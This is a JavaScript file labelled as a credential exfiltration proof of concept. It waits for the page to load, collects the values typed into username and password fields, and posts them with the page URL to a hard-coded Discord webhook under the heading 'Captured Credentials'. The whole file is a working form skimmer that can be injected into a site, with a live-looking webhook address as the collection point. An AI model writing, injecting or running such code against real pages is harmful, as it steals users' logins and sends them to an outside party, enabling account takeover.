// poc.js - Credential exfil PoC

(function () {
  function getCreds() {
    const inputs = document.getElementsByTagName('input');
    let username = '';
    let password = '';

    for (let i = 0; i < inputs.length; i++) {
      const type = inputs[i].type.toLowerCase();
      if (type === 'text' || inputs[i].name.toLowerCase().includes('user')) {
        username = inputs[i].value;
      } else if (type === 'password') {
        password = inputs[i].value;
      }
    }

    return { username, password };
  }

  function sendToWebhook(creds) {
    fetch('https://discord.com/api/webhooks/1443347424805523506/wD-wkxSLEYKVcc2KXImsqDidIPCfZdkiKHrNuitA-T8rmBIwTfuSf5KukdB39RHJ1-7X', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `🛑 **Captured Credentials**\n👤 Username: \`${creds.username}\`\n🔒 Password: \`${creds.password}\`\n📦 DOM URL: ${document.location.href}`
      })
    });
  }

  // Delay slightly to ensure inputs are rendered (if page is slow)
  window.addEventListener('load', () => {
    setTimeout(() => {
      const creds = getCreds();
      if (creds.username || creds.password) {
        sendToWebhook(creds);
      }
    }, 1000); // delay to wait for inputs to be populated
  });
})();
